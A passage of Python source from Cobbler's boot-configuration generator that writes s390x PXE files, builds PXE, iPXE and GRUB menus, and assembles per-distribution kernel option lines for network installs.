distro.arch in (enums.Archs.S390, enums.Archs.S390X):\n            short_name = system.name.split('.')[0]\n            s390_name = 'linux' + short_name[7:10]\n            self.logger.info(\"Writing s390x pxe config for %s\", short_name)\n            # Always write a system specific _conf and _parm file\n            pxe_f = os.path.join(self.bootloc, \"s390x\", \"s_%s\" % s390_name)\n            conf_f = \"%s_conf\" % pxe_f\n            parm_f = \"%s_parm\" % pxe_f\n\n            self.logger.info(\"Files: (conf,param) - (%s,%s)\", conf_f, parm_f)\n            blended = utils.blender(self.api, True, system)\n            # FIXME: profiles also need this data!\n            # gather default kernel_options and default kernel_options_s390x\n            kernel_options = self.build_kernel_options(system, profile, distro,\n                                                       image, \"s390x\", blended.get(\"autoinstall\", \"\"))\n            kopts_aligned = \"\"\n            column = 0\n            for option in kernel_options.split():\n                opt_len = len(option)\n                if opt_len > 78:\n                    kopts_aligned += '\\n' + option + ' '\n                    column = opt_len + 1\n                    self.logger.error(\"Kernel paramer [%s] too long %s\" % (option, opt_len))\n                    continue\n                if column + opt_len > 78:\n                    kopts_aligned += '\\n' + option + ' '\n                    column = opt_len + 1\n                else:\n                    kopts_aligned += option + ' '\n                    column += opt_len + 1\n\n            # Write system specific zPXE file\n            if system.is_management_supported():\n                if system.netboot_enabled:\n                    self.logger.info(\"S390x: netboot_enabled\")\n                    kernel_path = os.path.join(\"/images\", distro.name, os.path.basename(distro.kernel))\n                    initrd_path = os.path.join(\"/images\", distro.name, os.path.basename(distro.initrd))\n                    with open(pxe_f, 'w') as out:\n                        out.write(kernel_path + '\\n' + initrd_path + '\\n')\n                    with open(parm_f, 'w') as out:\n                        out.write(kopts_aligned)\n                    # Write conf file with one newline in it if netboot is enabled\n                    with open(conf_f, 'w') as out:\n                        out.write('\\n')\n                else:\n                    self.logger.info(\"S390x: netboot_disabled\")\n                    # Write empty conf file if netboot is disabled\n                    open(conf_f, 'w').close()\n            else:\n                # ensure the files do exist\n                self.logger.info(\"S390x: management not supported\")\n                utils.rmfile(pxe_f)\n                utils.rmfile(conf_f)\n                utils.rmfile(parm_f)\n            self.logger.info(\"S390x: pxe: [%s], conf: [%s], parm: [%s]\", pxe_f, conf_f, parm_f)\n\n            return\n\n        # generate one record for each described NIC ..\n        for (name, _) in list(system.interfaces.items()):\n\n            # Passing \"pxe\" here is a hack, but we need to make sure that\n            # get_config_filename() will return a filename in the pxelinux\n            # format.\n            pxe_name = system.get_config_filename(interface=name, loader=\"pxe\")\n            grub_name = system.get_config_filename(interface=name, loader=\"grub\")\n\n            if pxe_name is not None:\n                pxe_path = os.path.join(self.bootloc, \"pxelinux.cfg\", pxe_name)\n            else:\n                pxe_path = \"\"\n\n            if grub_name is not None:\n                grub_path = os.path.join(self.bootloc, \"grub\", \"system\", grub_name)\n            else:\n                grub_path = \"\"\n\n            if grub_path == \"\" and pxe_path == \"\":\n                self.logger.warning(\"invalid interface recorded for system (%s,%s)\", system.name, name)\n                continue\n\n            if image_based:\n                working_arch = image.arch\n            else:\n                working_arch = distro.arch\n\n            if working_arch is None:\n                raise CX(\"internal error, invalid arch supplied\")\n\n            # for tftp only ...\n            if working_arch in [Archs.I386, Archs.X86_64, Archs.ARM, Archs.AARCH64,\n                                Archs.PPC, Archs.PPC64, Archs.PPC64LE, Archs.PPC64EL]:\n                # ToDo: This is old, move this logic into item_system.get_config_filename()\n                pass\n            else:\n                continue\n\n            if system.is_management_supported():\n                if not image_based:\n                    if pxe_path:\n                        self.write_pxe_file(pxe_path, system, profile, distro,\n                                            working_arch, metadata=pxe_metadata)\n                    if grub_path:\n                        self.write_pxe_file(grub_path, system, profile, distro,\n                                            working_arch, format=\"grub\")\n                        # Generate a link named after system to the mac file for easier lookup\n                        link_path = os.path.join(self.bootloc, \"grub\", \"system_link\", system.name)\n                        utils.rmfile(link_path)\n                        utils.mkdir(os.path.dirname(link_path))\n                        os.symlink(os.path.join(\"..\", \"system\", grub_name), link_path)\n                else:\n                    self.write_pxe_file(pxe_path, system, None, None, working_arch, image=profile,\n                                        metadata=pxe_metadata)\n            else:\n                # ensure the file doesn't exist\n                utils.rmfile(pxe_path)\n                if grub_path:\n                    utils.rmfile(grub_path)\n\n    def make_pxe_menu(self) -> Dict[str, str]:\n        \"\"\"\n        Generates pxe, ipxe and grub boot menus.\n        \"\"\"\n        # only do this if there is NOT a system named default.\n        default = self.systems.find(name=\"default\")\n\n        if default is None:\n            timeout_action = \"local\"\n        else:\n            timeout_action = default.profile\n\n        boot_menu = {}\n        metadata = self.get_menu_items()\n        loader_metadata = metadata\n        menu_items = metadata[\"menu_items\"]\n        menu_labels = metadata[\"menu_labels\"]\n        loader_metadata[\"pxe_timeout_profile\"] = timeout_action\n\n        # Write the PXE menu:\n        if 'pxe' in menu_items:\n            loader_metadata[\"menu_items\"] = menu_items['pxe']\n            loader_metadata[\"menu_labels\"] = {}\n            outfile = os.path.join(self.bootloc, \"pxelinux.cfg\", \"default\")\n            template_src = open(os.path.join(self.settings.boot_loader_conf_template_dir, \"pxe_menu.template\"))\n            template_data = template_src.read()\n            boot_menu['pxe'] = self.templar.render(template_data, loader_metadata, outfile)\n            template_src.close()\n\n        # Write the iPXE menu:\n        if 'ipxe' in menu_items:\n            loader_metadata[\"menu_items\"] = menu_items['ipxe']\n            loader_metadata[\"menu_labels\"] = menu_labels['ipxe']\n            outfile = os.path.join(self.bootloc, \"ipxe\", \"default.ipxe\")\n            template_src = open(os.path.join(self.settings.boot_loader_conf_template_dir, \"ipxe_menu.template\"))\n            template_data = template_src.read()\n            boot_menu['ipxe'] = self.templar.render(template_data, loader_metadata, outfile)\n            template_src.close()\n\n        # Write the grub menu:\n        for arch in utils.get_valid_archs():\n            arch_metadata = self.get_menu_items(arch)\n            arch_menu_items = arch_metadata[\"menu_items\"]\n\n            if 'grub' in arch_menu_items:\n                boot_menu[\"grub\"] = arch_menu_items\n                outfile = os.path.join(self.bootloc, \"grub\", \"{0}_menu_items.cfg\".format(arch))\n                with open(outfile, \"w+\") as fd:\n                    fd.write(arch_menu_items[\"grub\"])\n        return boot_menu\n\n    def get_menu_items(self, arch: Optional[str] = None) -> dict:\n        \"\"\"\n        Generates menu items for pxe, ipxe and grub. Grub menu items are grouped into submenus by profile.\n\n        :param arch: The processor architecture to generate the menu items for. (Optional)\n        :returns: A dictionary with the pxe, ipxe and grub menu items. It has the keys from\n                  utils.get_supported_system_boot_loaders().\n        \"\"\"\n        return self.get_menu_level(None, arch)\n\n    def get_submenus(self, menu, metadata: dict, arch: str):\n        \"\"\"\n        Generates submenus metatdata for pxe, ipxe and grub.\n\n        :param menu: The menu for which boot files are generated. (Optional)\n        :param metadata: Pass additional parameters to the ones being collected during the method.\n        :param arch: The processor architecture to generate the menu items for. (Optional)\n        \"\"\"\n        if menu:\n            child_names = menu.get_children(sort_list=True)\n            childs = []\n            for child in child_names:\n                child = self.api.find_menu(name=child)\n                if child is not None:\n                    childs.append(child)\n        else:\n            childs = [child for child in self.menus if child.parent is None]\n\n        nested_menu_items = {}\n        menu_labels = {}\n        boot_loaders = utils.get_supported_system_boot_loaders()\n\n        for child in childs:\n            temp_metadata = self.get_menu_level(child, arch)\n            temp_items = temp_metadata[\"menu_items\"]\n\n            for boot_loader in boot_loaders:\n                if boot_loader in temp_items:\n                    if boot_loader in nested_menu_items:\n                        nested_menu_items[boot_loader] += temp_items[boot_loader]\n                    else:\n                        nested_menu_items[boot_loader] = temp_items[boot_loader]\n\n            if \"ipxe\" in temp_items:\n                if \"ipxe\" not in menu_labels:\n                    menu_labels[\"ipxe\"] = []\n                display_name = child.display_name if child.display_name and child.display_name != \"\" else child.name\n                menu_labels[\"ipxe\"].append({\"name\": child.name, \"display_name\": display_name})\n\n        for boot_loader in boot_loaders:\n            if boot_loader in nested_menu_items and nested_menu_items[boot_loader] != \"\":\n                nested_menu_items[boot_loader] = nested_menu_items[boot_loader][:-1]\n\n        metadata[\"menu_items\"] = nested_menu_items\n        metadata[\"menu_labels\"] = menu_labels\n\n    def get_profiles_menu(self, menu, metadata, arch: str):\n        \"\"\"\n        Generates profiles metadata for pxe, ipxe and grub.\n\n        :param menu: The menu for which boot files are generated. (Optional)\n        :param metadata: Pass additional parameters to the ones being collected during the method.\n        :param arch: The processor architecture to generate the menu items for. (Optional)\n        \"\"\"\n        if menu:\n            profile_list = [profile for profile in self.profiles if profile.menu == menu.name]\n        else:\n            profile_list = [profile for profile in self.profiles if profile.menu is None or profile.menu == \"\"]\n        profile_list = sorted(profile_list, key=lambda profile: profile.name)\n        if arch:\n            profile_list = [profile for profile in profile_list if profile.arch == arch]\n\n        current_menu_items = {}\n        menu_labels = metadata[\"menu_labels\"]\n\n        for profile in profile_list:\n            if not profile.enable_menu:\n                # This profile has been excluded from the menu\n                continue\n            arch = None\n            distro = profile.get_conceptual_parent()\n            boot_loaders = profile.boot_loaders\n\n            if distro:\n                arch = distro.arch\n\n            for boot_loader in boot_loaders:\n                if boot_loader not in profile.boot_loaders:\n                    continue\n                contents = self.write_pxe_file(filename=None, system=None, profile=profile, distro=distro, arch=arch,\n                                               image=None, format=boot_loader)\n                if contents and contents != \"\":\n                    if boot_loader not in current_menu_items:\n                        current_menu_items[boot_loader] = \"\"\n                    current_menu_items[boot_loader] += contents\n\n                    # iPXE Level menu\n                    if boot_loader == \"ipxe\":\n                        current_menu_items[boot_loader] += \"\\n\"\n                        if \"ipxe\" not in menu_labels:\n                            menu_labels[\"ipxe\"] = []\n                        menu_labels[\"ipxe\"].append({\"name\": profile.name, \"display_name\": profile.name})\n\n        metadata[\"menu_items\"] = current_menu_items\n        metadata[\"menu_labels\"] = menu_labels\n\n    def get_images_menu(self, menu, metadata, arch: str):\n        \"\"\"\n        Generates profiles metadata for pxe, ipxe and grub.\n\n        :param menu: The menu for which boot files are generated. (Optional)\n        :param metadata: Pass additional parameters to the ones being collected during the method.\n        :param arch: The processor architecture to generate the menu items for. (Optional)\n        \"\"\"\n        if menu:\n            image_list = [image for image in self.images if image.menu == menu.name]\n        else:\n            image_list = [image for image in self.images if image.menu is None or image.menu == \"\"]\n        image_list = sorted(image_list, key=lambda image: image.name)\n\n        current_menu_items = metadata[\"menu_items\"]\n        menu_labels = metadata[\"menu_labels\"]\n\n        # image names towards the bottom\n        for image in image_list:\n            if os.path.exists(image.file):\n                arch = image.arch\n                boot_loaders = image.boot_loaders\n\n                for boot_loader in boot_loaders:\n                    if boot_loader not in image.boot_loaders:\n                        continue\n                    contents = self.write_pxe_file(filename=None, system=None, profile=None, distro=None, arch=arch,\n                                                   image=image, format=boot_loader)\n                    if contents and contents != \"\":\n                        if boot_loader not in current_menu_items:\n                            current_menu_items[boot_loader] = \"\"\n                        current_menu_items[boot_loader] += contents\n\n                        # iPXE Level menu\n                        if boot_loader == \"ipxe\":\n                            current_menu_items[boot_loader] += \"\\n\"\n                            if \"ipxe\" not in menu_labels:\n                                menu_labels[\"ipxe\"] = []\n                            menu_labels[\"ipxe\"].append({\"name\": image.name, \"display_name\": image.name})\n\n        boot_loaders = utils.get_supported_system_boot_loaders()\n        for boot_loader in boot_loaders:\n            if boot_loader in current_menu_items and current_menu_items[boot_loader] != \"\":\n                current_menu_items[boot_loader] = current_menu_items[boot_loader][:-1]\n\n        metadata[\"menu_items\"] = current_menu_items\n        metadata[\"menu_labels\"] = menu_labels\n\n    def get_menu_level(self, menu=None, arch: str = None) -> dict:\n        \"\"\"\n        Generates menu items for submenus, pxe, ipxe and grub.\n\n        :param menu: The menu for which boot files are generated. (Optional)\n        :param arch: The processor architecture to generate the menu items for. (Optional)\n        :returns: A dictionary with the pxe and grub menu items. It has the keys from\n                  utils.get_supported_system_boot_loaders().\n        \"\"\"\n        metadata = {}\n        template_data = {}\n        boot_loaders = utils.get_supported_system_boot_loaders()\n\n        for boot_loader in boot_loaders:\n            template = os.path.join(self.settings.boot_loader_conf_template_dir, \"%s_submenu.template\" % boot_loader)\n            if os.path.exists(template):\n                with open(template) as template_fh:\n                    template_data[boot_loader] = template_fh.read()\n                if menu:\n                    parent_menu = menu.parent\n                    metadata[\"menu_name\"] = menu.name\n                    metadata[\"menu_label\"] = \\\n                        menu.display_name if menu.display_name and menu.display_name != \"\" else menu.name\n                    if parent_menu:\n                        metadata[\"parent_menu_name\"] = parent_menu.name\n                        if parent_menu.display_name and parent_menu.display_name != \"\":\n                            metadata[\"parent_menu_label\"] = parent_menu.display_name\n                        else:\n                            metadata[\"parent_menu_label\"] = parent_menu.name\n                    else:\n                        metadata[\"parent_menu_name\"] = \"Cobbler\"\n                        metadata[\"parent menu_label\"] = \"Cobbler\"\n            else:\n                self.logger.warning(\"Template for building a submenu not found for bootloader \\\"%s\\\"! Submenu \"\n                                    \"structure thus missing for this bootloader.\", boot_loader)\n\n        self.get_submenus(menu, metadata, arch)\n        nested_menu_items = metadata[\"menu_items\"]\n        self.get_profiles_menu(menu, metadata, arch)\n        current_menu_items = metadata[\"menu_items\"]\n        self.get_images_menu(menu, metadata, arch)\n        current_menu_items = metadata[\"menu_items\"]\n\n        menu_items = {}\n        menu_labels = metadata[\"menu_labels\"]\n        line_pat = re.compile(r\"^(.+)$\", re.MULTILINE)\n        line_sub = \"\\t\\\\g<1>\"\n\n        for boot_loader in boot_loaders:\n            if boot_loader not in nested_menu_items and boot_loader not in current_menu_items:\n                continue\n\n            menu_items[boot_loader] = \"\"\n            if boot_loader == \"ipxe\":\n                if menu:\n                    if boot_loader in current_menu_items:\n                        menu_items[boot_loader] = current_menu_items[boot_loader]\n                    if boot_loader in nested_menu_items:\n                        menu_items[boot_loader] += nested_menu_items[boot_loader]\n                else:\n                    if boot_loader in nested_menu_items:\n                        menu_items[boot_loader] = nested_menu_items[boot_loader]\n                    if boot_loader in current_menu_items:\n                        menu_items[boot_loader] += '\\n' + current_menu_items[boot_loader]\n            else:\n                if boot_loader in nested_menu_items:\n                    menu_items[boot_loader] = nested_menu_items[boot_loader]\n                if boot_loader in current_menu_items:\n                    if menu is None:\n                        menu_items[boot_loader] += '\\n'\n                    menu_items[boot_loader] += current_menu_items[boot_loader]\n                # Indentation for nested pxe and grub menu items.\n                if menu:\n                    menu_items[boot_loader] = line_pat.sub(line_sub, menu_items[boot_loader])\n\n            if menu and boot_loader in template_data:\n                metadata[\"menu_items\"] = menu_items[boot_loader]\n                if boot_loader in menu_labels:\n                    metadata[\"menu_labels\"] = menu_labels[boot_loader]\n                menu_items[boot_loader] = self.templar.render(template_data[boot_loader], metadata, None)\n                if boot_loader == \"ipxe\":\n                    menu_items[boot_loader] += '\\n'\n        metadata[\"menu_items\"] = menu_items\n        metadata[\"menu_labels\"] = menu_labels\n        return metadata\n\n    def write_pxe_file(self, filename, system, profile, distro, arch: Archs, image=None, metadata=None,\n                       format: str = \"pxe\") -> str:\n        \"\"\"\n        Write a configuration file for the boot loader(s).\n\n        More system-specific configuration may come in later, if so that would appear inside the system object in api.py\n        Can be used for different formats, \"pxe\" (default) and \"grub\".\n\n        :param filename: If present this writes the output into the giving filename. If not present this method just\n                         returns the generated configuration.\n        :param system: If you supply a system there are other templates used then when using only a profile/image/\n                       distro.\n        :param profile: The profile to generate the pxe-file for.\n        :param distro: If you don't ship an image, this is needed. Otherwise this just supplies information needed for\n                       the templates.\n        :param arch: The processor architecture to generate the pxefile for.\n        :param image: If you want to be able to deploy an image, supply this parameter.\n        :param metadata: Pass additional parameters to the ones being collected during the method.\n        :param format: Can be any of those returned by utils.get_supported_system_boot_loaders().\n        :return: The generated filecontent for the required item.\n        \"\"\"\n\n        if arch is None:\n            raise CX(\"missing arch\")\n\n        if image and not os.path.exists(image.file):\n            return None  # nfs:// URLs or something, can't use for TFTP\n\n        if metadata is None:\n            metadata = {}\n\n        boot_loaders = None\n        if system:\n            boot_loaders = system.boot_loaders\n            metadata[\"menu_label\"] = system.name\n            metadata[\"menu_name\"] = system.name\n        elif profile:\n            boot_loaders = profile.boot_loaders\n            metadata[\"menu_label\"] = profile.name\n            metadata[\"menu_name\"] = profile.name\n        elif image:\n            boot_loaders = image.boot_loaders\n            metadata[\"menu_label\"] = image.name\n            metadata[\"menu_name\"] = image.name\n        if boot_loaders is None or format not in boot_loaders:\n            return None\n\n        (rval, settings) = utils.input_string_or_dict(self.settings.to_dict())\n        if rval:\n            for key in list(settings.keys()):\n                metadata[key] = settings[key]\n        # ---\n        # just some random variables\n        buffer = \"\"\n\n        template = os.path.join(self.settings.boot_loader_conf_template_dir, format + \".template\")\n        self.build_kernel(metadata, system, profile, distro, image, format)\n\n        # generate the kernel options and append line:\n        kernel_options = self.build_kernel_options(system, profile, distro,\n                                                   image, arch.value, metadata[\"autoinstall\"])\n        metadata[\"kernel_options\"] = kernel_options\n\n        if distro and distro.os_version.startswith(\"esxi\") and filename is not None:\n            append_line = \"BOOTIF=%s\" % (os.path.basename(filename))\n        else:\n            append_line = \"append \"\n        append_line = \"%s%s\" % (append_line, kernel_options)\n        if distro and distro.os_version.startswith(\"xenserver620\"):\n            append_line = \"%s\" % (kernel_options)\n        metadata[\"append_line\"] = append_line\n\n        # store variables for templating\n        if system:\n            if system.serial_device or system.serial_baud_rate:\n                if system.serial_device:\n                    serial_device = system.serial_device\n                else:\n                    serial_device = 0\n                if system.serial_baud_rate:\n                    serial_baud_rate = system.serial_baud_rate.value\n                else:\n                    serial_baud_rate = 115200\n\n                if format == \"pxe\":\n                    buffer += \"serial %d %d\\n\" % (serial_device, serial_baud_rate)\n                elif format == \"grub\":\n                    buffer += \"set serial_console=true\\nset serial_baud={baud}\\nset serial_line={device}\\n\" \\\n                        .format(baud=serial_baud_rate, device=serial_device)\n\n        # get the template\n        if metadata[\"kernel_path\"] is not None:\n            template_fh = open(template)\n            template_data = template_fh.read()\n            template_fh.close()\n        else:\n            # this is something we can't PXE boot\n            template_data = \"\\n\"\n\n        # save file and/or return results, depending on how called.\n        buffer += self.templar.render(template_data, metadata, None)\n\n        if filename is not None:\n            self.logger.info(\"generating: %s\", filename)\n            # Ensure destination path exists to avoid race condition\n            if not os.path.exists(os.path.dirname(filename)):\n                utils.mkdir(os.path.dirname(filename))\n            with open(filename, \"w\") as fd:\n                fd.write(buffer)\n        return buffer\n\n    def build_kernel(self, metadata, system, profile, distro, image=None, boot_loader: str = \"pxe\"):\n        \"\"\"\n        Generates kernel and initrd metadata.\n\n        :param metadata: Pass additional parameters to the ones being collected during the method.\n        :param profile: The profile to generate the pxe-file for.\n        :param distro: If you don't ship an image, this is needed. Otherwise this just supplies information needed for\n                       the templates.\n        :param image: If you want to be able to deploy an image, supply this parameter.\n        :param boot_loader: Can be any of those returned by utils.get_supported_system_boot_loaders().\n        \"\"\"\n        kernel_path = None\n        initrd_path = None\n        img_path = None\n\n        # ---\n\n        if system:\n            blended = utils.blender(self.api, True, system)\n            meta_blended = utils.blender(self.api, False, system)\n        elif profile:\n            blended = utils.blender(self.api, True, profile)\n            meta_blended = utils.blender(self.api, False, profile)\n        elif image:\n            blended = utils.blender(self.api, True, image)\n            meta_blended = utils.blender(self.api, False, image)\n        else:\n            blended = {}\n            meta_blended = {}\n\n        autoinstall_meta = meta_blended.get(\"autoinstall_meta\", {})\n        metadata.update(blended)\n\n        if image is None:\n            # not image based, it's something normalish\n            img_path = os.path.join(\"/images\", distro.name)\n            if boot_loader in [\"grub\", \"ipxe\"]:\n                if distro.remote_grub_kernel:\n                    kernel_path = distro.remote_grub_kernel\n                if distro.remote_grub_initrd:\n                    initrd_path = distro.remote_grub_initrd\n\n            if 'http' in distro.kernel and 'http' in distro.initrd:\n                if not kernel_path:\n                    kernel_path = distro.kernel\n                if not initrd_path:\n                    initrd_path = distro.initrd\n\n            if not kernel_path:\n                kernel_path = os.path.join(img_path, os.path.basename(distro.kernel))\n            if not initrd_path:\n                initrd_path = os.path.join(img_path, os.path.basename(distro.initrd))\n        else:\n            # this is an image we are making available, not kernel+initrd\n            if image.image_type == \"direct\":\n                kernel_path = os.path.join(\"/images2\", image.name)\n            elif image.image_type == \"memdisk\":\n                kernel_path = \"/memdisk\"\n                initrd_path = os.path.join(\"/images2\", image.name)\n            else:\n                # CD-ROM ISO or virt-clone image? We can't PXE boot it.\n                kernel_path = None\n                initrd_path = None\n\n        if \"img_path\" not in metadata:\n            metadata[\"img_path\"] = img_path\n        if \"kernel_path\" not in metadata:\n            metadata[\"kernel_path\"] = kernel_path\n        if \"initrd_path\" not in metadata:\n            metadata[\"initrd_path\"] = initrd_path\n\n        if \"kernel\" in autoinstall_meta:\n            kernel_path = autoinstall_meta[\"kernel\"]\n\n            if not utils.file_is_remote(kernel_path):\n                kernel_path = os.path.join(img_path, os.path.basename(kernel_path))\n            metadata[\"kernel_path\"] = kernel_path\n\n        metadata[\"initrd\"] = self._generate_initrd(autoinstall_meta, kernel_path, initrd_path, boot_loader)\n\n    def build_kernel_options(self, system, profile, distro, image, arch: str, autoinstall_path) -> str:\n        \"\"\"\n        Builds the full kernel options line.\n\n        :param system: The system to generate the kernel options for.\n        :param profile: Although the system contains the profile please specify it explicitly here.\n        :param distro: Although the profile contains the distribution please specify it explicitly here.\n        :param image: The image to generate the kernel options for.\n        :param arch: The processor architecture to generate the kernel options for.\n        :param autoinstall_path: The autoinstallation path. Normally this will be a URL because you want to pass a link\n                                 to an autoyast, preseed or kickstart file.\n        :return: The generated kernel line options.\n        \"\"\"\n\n        management_interface = None\n        management_mac = None\n        if system is not None:\n            blended = utils.blender(self.api, False, system)\n            # find the first management interface\n            try:\n                for intf in list(system.interfaces.keys()):\n                    if system.interfaces[intf][\"management\"]:\n                        management_interface = intf\n                        if system.interfaces[intf][\"mac_address\"]:\n                            management_mac = system.interfaces[intf][\"mac_address\"]\n                        break\n            except:\n                # just skip this then\n                pass\n        elif profile is not None:\n            blended = utils.blender(self.api, False, profile)\n        else:\n            blended = utils.blender(self.api, False, image)\n\n        append_line = \"\"\n        kopts = blended.get(\"kernel_options\", dict())\n        kopts = utils.revert_strip_none(kopts)\n\n        # SUSE and other distro specific kernel additions or modifications\n        if distro is not None:\n            if system is None:\n                utils.kopts_overwrite(kopts, self.settings.server, distro.breed)\n            else:\n                utils.kopts_overwrite(kopts, self.settings.server, distro.breed, system.name)\n\n        # support additional initrd= entries in kernel options.\n        if \"initrd\" in kopts:\n            append_line = \",%s\" % kopts.pop(\"initrd\")\n        hkopts = utils.dict_to_string(kopts)\n        append_line = \"%s %s\" % (append_line, hkopts)\n\n        # automatic installation file path rewriting (get URLs for local files)\n        if autoinstall_path:\n\n            # FIXME: need to make shorter rewrite rules for these URLs\n\n            # changing http_server's server component to its IP address was intruduced with\n            # https://github.com/cobbler/cobbler/commit/588756aa7aefc122310847d007becf3112647944\n            # to shorten the message length for S390 systems.\n            # On multi-homed cobbler servers, this can lead to serious problems when installing\n            # systems in a dedicated isolated installation subnet:\n            # - typically, $server is reachable by name (DNS resolution assumed) both during PXE\n            #   install and during production, but via different IP addresses\n            # - $http_server is explicitly constructed from $server\n            # - the IP address for $server may resolv differently between cobbler server (production)\n            #   and installing system\n            # - using IP($http_server) below may need to set $server in a way that matches the installation\n            #   network\n            # - using $server for later repository access then will fail, because the installation address\n            #   isn't reachable for production systems\n            #\n            # In order to make the revert less intrusive, it'll depend on a configuration setting\n            if self.settings and self.settings.convert_server_to_ip:\n                try:\n                    httpserveraddress = socket.gethostbyname_ex(blended[\"http_server\"])[2][0]\n                except socket.gaierror:\n                    httpserveraddress = blended[\"http_server\"]\n            else:\n                httpserveraddress = blended[\"http_server\"]\n\n            URL_REGEX = \"[a-zA-Z]*://.*\"\n            local_autoinstall_file = not re.match(URL_REGEX, autoinstall_path)\n            if local_autoinstall_file:\n                if system is not None:\n                    autoinstall_path = \"http://%s/cblr/svc/op/autoinstall/system/%s\" % (httpserveraddress, system.name)\n                else:\n                    autoinstall_path = \"http://%s/cblr/svc/op/autoinstall/profile/%s\" \\\n                                       % (httpserveraddress, profile.name)\n\n            if distro.breed is None or distro.breed == \"redhat\":\n\n                append_line += \" kssendmac\"\n                append_line = \"%s inst.ks=%s\" % (append_line, autoinstall_path)\n                ipxe = blended[\"enable_ipxe\"]\n                if ipxe:\n                    append_line = append_line.replace('ksdevice=bootif', 'ksdevice=${net0/mac}')\n            elif distro.breed == \"suse\":\n                append_line = \"%s autoyast=%s\" % (append_line, autoinstall_path)\n                if management_mac and distro.arch not in (enums.Archs.S390, enums.Archs.S390X):\n                    append_line += \" netdevice=%s\" % management_mac\n            elif distro.breed == \"debian\" or distro.breed == \"ubuntu\":\n                append_line = \"%s auto-install/enable=true priority=critical netcfg/choose_interface=auto url=%s\" \\\n                              % (append_line, autoinstall_path)\n                if management_interface:\n                    append_line += \" netcfg/choose_interface=%s\" % management_interface\n            elif distro.breed == \"freebsd\":\n                append_line = \"%s ks=%s\" % (append_line, autoinstall_path)\n\n                # rework kernel options for debian distros\n                translations = {'ksdevice': \"interface\", 'lang': \"locale\"}\n                for k, v in list(translations.items()):\n                    append_line = append_line.replace(\"%s=\" % k, \"%s=\" % v)\n\n                # interface=bootif causes a failure\n                append_line = append_line.replace(\"interface=bootif\", \"\")\n            elif distro.breed == \"vmware\":\n                if distro.os_version.find(\"esxi\") != -1:\n                    # ESXi is very picky, it's easier just to redo the\n                    # entire append line here since\n                    append_line = \" ks=%s %s\" % (autoinstall_path, hkopts)\n                    # ESXi likes even fewer options, so we remove them too\n                    append_line = append_line.replace(\"kssendmac\", \"\")\n                else:\n                    append_line = \"%s vmkopts=debugLogToSerial:1 mem=512M ks=%s\" % \\\n                                  (append_line, autoinstall_path)\n                # interface=bootif causes a failure\n                append_line = append_line.replace(\"ksdevice=bootif\", \"\")\n            elif distro.breed == \"xen\":\n                if distro.os_version.find(\"xenserver620\") != -1:\n                    img_path = os.path.join(\"/images\", distro.name)\n                    append_line = \"append %s/xen.gz dom0_max_vcpus=2 dom0_mem=752M com1=115200,8n1 console=com1,\" \\\n                                  \"vga --- %s/vmlinuz xencons=hvc console=hvc0 console=tty0 install answerfile=%s ---\" \\\n                                  \" %s/install.img\" % (img_path, img_path, autoinstall_path, img_path)\n                    return append_line\n            elif distro.breed == \"powerkvm\":\n                append_line += \" kssendmac\"\n                append_line = \"%s kvmp.inst.auto=%s\" % (append_line, autoinstall_path)\n\n        if distro is not None and (distro.breed in [\"debian\", \"ubuntu\"]):\n            # Hostname is required as a parameter, the one in the preseed is not respected, so calculate if we have one\n            # here.\n            # We're trying: first part of FQDN in hostname field, then system name, then profile name.\n            # In Ubuntu, this is at least used for the volume group name when using LVM.\n            domain = \"local.lan\"\n            if system is not None:\n                if system.hostname is not None and system.hostname != \"\":\n                    # If this is a FQDN, grab the first bit\n                    hostname = system.hostname.split(\".\")[0]\n                    _domain = system.hostname.split(\".\")[1:]\n                    if _domain:\n                        domain = \".\".join(_domain)\n                else:\n                    hostname = system.name\n            else:\n                # ubuntu at the very least does not like having underscores\n                # in the hostname.\n                # FIXME: Really this should remove all characters that are\n                # forbidden in hostnames\n                hostname = profile.name.replace(\"_\", \"\")\n\n            # At least for debian deployments configured for DHCP networking this values are not used, but specifying\n            # here avoids questions\n            append_line = \"%s hostname=%s\" % (append_line, hostname)\n            append_line = \"%s domain=%s\" % (append_line, domain)\n\n            # A similar issue exists with suite name, as installer requires the existence of \"stable\" in the dists\n            # directory\n            append_line = \"%s suite=%s\" % (append_line, distro.os_version)\n\n        # append necessary kernel args for arm architectures\n        if arch is enums.Archs.ARM:\n            append_line = \"%s fixrtc vram=48M omapfb.vram=0:24M\" % append_line\n\n        # do variable substitution on the append line\n        # promote all of the autoinstall_meta variables\n        if \"autoinstall_meta\" in blended:\n            blended.update(blended[\"autoinstall_meta\"])\n        append_line = self.templar.render(append_line, utils.flatten(blended), None)\n\n        # For now console=ttySx,BAUDRATE are only set for systems\n        # This could get enhanced for profile/distro via utils.blender (inheritance)\n        # This also is architecture specific. E.g: Some ARM consoles need: console=ttyAMAx,BAUDRATE\n        # I guess we need a serial_kernel_dev = param, that can be set to \"ttyAMA\" if needed.\n        if system and arch == Archs.X86_64:\n            if system.serial_device or system.serial_baud_rate:\n                if system.serial_device:\n                    serial_device = system.serial_device\n                else:\n                    serial_device = 0\n                if system.serial_baud_rate:\n                    serial_baud_rate = system.serial_baud_rate.value\n                else:\n                    serial_baud_rate = 115200\n\n                append_line = \"%s console=ttyS%s,%s\" % (append_line, serial_device, serial_baud_rate)\n\n        # FIXME - the append_line length limit is architecture specific\n        if len(append_line) >= 1023:\n            self.logger.warning(\"warning: kernel option length exceeds 1023\")\n\n        return append_line\n\n    def write_templates(self, obj, write_file: bool = False, path=None) -> Dict[str, str]:\n        \"\"\"\n        A semi-generic function that will take an object with a template_files dict {source:destiation}, and generate a\n        rendered file. The write_file option allows for generating of the rendered output without actually creating any\n        files.\n\n        :param obj: The object to write the template files for.\n        :param write_file: If the generated template should be written to the disk.\n        :param path: TODO: A useless parameter?\n        :return: A dict of the destination file names (after variable substitution is done) and the data in the file.\n        \"\"\"\n        self.logger.info(\"Writing template files for %s\", obj.name)\n\n        results = {}\n\n        try:\n            templates = obj.template_files\n        except:\n            return results\n\n        blended = utils.blender(self.api, False, obj)\n\n        if obj.COLLECTION_TYPE == \"distro\":\n            if re.search(\"esxi[567]\", obj.os_version) is not None:\n                realbootcfg = open(os.path.join(os.path.dirname(obj.kernel), 'boot.cfg')).read()\n                bootmodules = re.findall(r'modules=(.*)', realbootcfg)\n                for modules in bootmodules:\n                    blended['esx_modules'] = modules.replace('/', '')\n\n        autoinstall_meta = blended.get(\"autoinstall_meta\", {})\n        try:\n            del blended[\"autoinstall_meta\"]\n        except:\n            pass\n        blended.update(autoinstall_meta)  # make available at top level\n\n        templates = blended.get(\"template_files\", {})\n        try:\n            del blended[\"template_files\"]\n        except:\n            pass\n        blended.update(templates)  # make available at 